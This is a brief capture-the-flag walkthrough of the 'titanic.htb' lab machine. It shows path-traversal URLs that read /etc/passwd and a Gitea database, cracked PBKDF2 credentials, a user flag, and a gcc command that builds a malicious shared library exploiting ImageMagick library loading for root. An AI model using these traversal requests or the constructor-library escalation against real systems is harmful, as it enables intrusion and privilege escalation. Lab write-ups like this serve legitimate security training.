titanic.htb 
============

nmap result:
------------

Open port: 22,80 

80 --> titanic.htb 

enumeration:
------------

http://titanic.htb/download?ticket=../../../../etc/passwd ==> works 

http://dev.titanic.htb


i found the web page is using gitea  - it is a open source 

http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db  --> gives the database 

in that database i found the user table contains creds..

if found it using the pbkd2 hash algorithm:

[DK = PBKDF2(Password, Salt, PRF, c, dkLen)]

PRF ==> rand c==> iteration(50000)    dkLen ==> length (50) 

[password] = e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56

[Salt] = 8bf3e3452b78544f8bee9400d6936d34

[PRF] = 0ce6f07fc9b557bc070fa7bef76a0d15

[c] = 50000

[dkLen] = 50


i cracked the password:

[Password] : 25282528

user.txt --> a8d3b05650e382086b9f0ecba9fcd252
=============================================

previledge escalation:
-----------------------

/opt/scripts/identify_images.sh  -->  script to retrieve info about jpg and store in metadata.log using the tool "magick"

magick -version ==> ImageMagick 7.1.1-35 Q16-HDRI x86_64 

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){

    system("cat /root/root.txt"); 

    exit(0); 

    } 

    EOF
